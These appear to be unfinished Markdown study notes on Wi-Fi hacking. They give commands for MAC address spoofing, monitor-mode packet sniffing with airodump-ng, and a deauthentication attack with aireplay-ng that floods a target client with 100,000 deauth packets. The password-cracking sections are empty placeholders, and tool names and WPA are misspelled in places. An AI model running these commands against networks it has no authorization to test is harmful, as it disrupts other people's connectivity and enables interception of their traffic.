# Network Hacking Main Page

- [Changing MAC Address](#mac)
- [WIFI Sniffing](#snif)
- [Deauth Attack](#deauth)
- [WIFI Password Craking](#wifipasscrack)
  - [WEP](#wep)
  - [WAP](#wap)
  - [WAP2](#wap2)

## Show available INTERFACE info
```bash
ifconfig
iwconfig
```

<a name="mac"/>

## Changing MAC adresse

**desc** : *Change MAC adresse*

MAC = Media Access Control

```bash
ifconfig <INTERFACE> down
ifconfig <INTERFACE> hw ether <MAC_ADDRESS> # hw for hardware
ifconfig <INTERFACE> up
```

<a name="snif"/>

## WIFI Sniffing

`aerodump-ng` is a packet sniffer
 - Use to capture packets within range
 - Display detailed info about networks
 - part of `aircrak-ng` suit

usage : `airodump-ng <INTERFACE>`

1. Must change wireless mode : Managed to Monitor
   ```bash
   # step 1
   ifconfig <INTERFACE> down
   # step 2
   airmon-ng check kill
   # step 3
   iwconfig <INTERFACE> mode monitor
   # step 4
   ifconfig <INTERFACE> up
   ```
3. Run `airodump-ng`

options :
- `--bssid <MAC_ADDRESS>` : Select MAC adresse to sniff
  - example
    - ```bash
      airodump-ng --bssid 00:11:22:33:44:55 --channel 2 --write save mon0`
      ```
- `--write <FILE_NAME>` : Save the sniffing to a file
  - Use [Wireshark]() to read the `.cap` file
- `--channel <CHANNEL_ID>`: Select channel 
- `--band` : Select frequency
  - "a" : use 5Gz only
  - "bg" : use 2.4Gz only
  - "n" : use both
  - "ac" : use lower than 6Gz
  -  example
     - ```bash
        airodump-ng --band abg mon0
        ```

Simple sniffing 2.4Gz
```bash
airodump-ng <INTERFACE>
```

<a name="deauth"/>

## Deauth Attack with `aireplay-ng`

usage : `aireplay-ng --deauth <#DEAUTH_PACKETS> -a <NETWORK_MAC> -c <TARGET_MAC> <INTERFACE>`

1. Run `aerodump-ng`
2. Run `aireplay-ng`

example : 
```bash
aireplay-ng --deauth 100000 -a 11:22:33:44:55:66 -c 00:11:22:33:44:55 mon0
```

<a name="wifipasscrack"/>

## WIFI password cracking

<a name="wep"/>

### WEP

TODO

<a name="wap"/>

### WAP

TODO

<a name="wap2"/>

### WAP2

TODO
